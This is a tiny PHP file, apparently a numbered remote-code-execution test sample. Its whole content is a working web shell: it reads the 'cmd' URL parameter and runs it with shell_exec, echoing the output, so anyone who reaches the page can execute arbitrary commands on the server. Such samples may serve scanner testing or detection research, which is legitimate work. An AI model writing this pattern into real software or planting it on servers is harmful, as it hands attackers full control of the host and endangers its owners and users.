<?php
// RCE test variation #607
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>